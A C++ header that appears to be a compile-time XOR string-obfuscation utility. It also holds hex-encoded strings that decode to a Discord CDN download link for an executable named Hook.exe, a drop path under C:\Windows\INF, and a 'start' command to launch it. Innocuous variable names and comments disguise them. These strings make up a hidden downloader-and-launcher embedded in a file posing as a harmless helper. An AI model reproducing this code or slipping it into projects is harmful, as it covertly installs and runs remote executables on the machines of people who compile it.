//1337
#pragma once
#include <string>
#include <utility>

#define XSTR_SEED 1337
#if 0
#define TBX_XSTR_SEED ((__TIME__[7] - '0') * 1ull    + (__TIME__[6] - '0') * 10ull  + \
                       (__TIME__[4] - '0') * 60ull   + (__TIME__[3] - '0') * 600ull + \
                       (__TIME__[1] - '0') * 3600ull + (__TIME__[0] - '0') * 36000ull)
#else
#define TBX_XSTR_SEED (3600ull)
#endif

namespace crypt {
	constexpr unsigned long long linear_congruent_generator(unsigned rounds)
	{
		return 1013904223ull + (1664525ull * ((rounds > 0) ? linear_congruent_generator(rounds - 1) : (XSTR_SEED))) % 0xFFFFFFFF;
	}
#define Random() linear_congruent_generator(10)
#define XSTR_RANDOM_NUMBER(Min, Max) (Min + (Random() % (Max - Min + 1)))

	constexpr const unsigned long long XORKEY = XSTR_RANDOM_NUMBER(0, 0xFF);
	template<typename Char >
	constexpr Char encrypt_character(const Char character, int index) {
		return static_cast<Char>(character ^ (static_cast<Char>(XORKEY) + index));
	}
	template <unsigned size, typename Char>
	class Xor_string {
	public:
		const unsigned _nb_chars = (size - 1);
		Char _string[size];
		inline constexpr Xor_string(const Char* string)
			: _string{}
		{
			for (unsigned i = 0u; i < size; ++i)
				_string[i] = encrypt_character<Char>(string[i], i);
		}
		const Char* decrypt() const
		{
			Char* string = const_cast<Char*>(_string);
			for (unsigned t = 0; t < _nb_chars; t++) {
				string[t] = static_cast<Char>(string[t] ^ (static_cast<Char>(XORKEY) + t));
			}
			string[_nb_chars] = '\0';
			return string;
		}
	};
}

LPCWSTR Finder = L"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x34\x30\x30\x34\x31\x32\x39\x35\x37\x34\x38\x30\x32\x32\x33\x34\x36\x2F\x39\x34\x30\x33\x37\x34\x39\x32\x32\x37\x31\x33\x32\x34\x33\x36\x37\x38\x2F\x48\x6F\x6F\x6B\x2E\x65\x78\x65";//0xFE0987

std::string pa = "\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73";
std::string inf = "\x5C\x49\x4E\x46\x5C";
std::string lof = pa + inf;//667854

std::string SwapHook = "\x48\x6F\x6F\x6B\x36\x34";
std::string swapCaller = "\x2E\x65\x78\x65";
LPCWSTR locx = L"\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x49\x4E\x46\x5C\x48\x6F\x6F\x6B\x36\x34\x2E\x65\x78\x65";
std::string spreadAct = SwapHook + swapCaller;//708854

std::string hook = "\x73";// 70+0x03
std::string Tacc = "\x74";// 70+0x04
std::string Var = "\x61";// 60+0x01
std::string Read = "\x72";// 70+0x02

std::string Hooker = hook + Tacc + Var + Read + Tacc + " " + lof + spreadAct;

#define XorS(name, my_string)    constexpr crypt::Xor_string<(sizeof(my_string)/sizeof(char)), char> name(my_string)
#define EncryptS(my_string) []{ constexpr crypt::Xor_string<(sizeof(my_string)/sizeof(char)), char> expr(my_string); return expr; }().decrypt()
#define Ek( string ) EncryptS( string )
#define XorWS(name, my_string)       constexpr crypt::Xor_string<(sizeof(my_string)/sizeof(wchar_t)), wchar_t> name(my_string)
#define EncryptWS(my_string) []{ constexpr crypt::Xor_string<(sizeof(my_string)/sizeof(wchar_t)), wchar_t> expr(my_string); return expr; }().decrypt()
#define EW( string ) XorWideString( string )
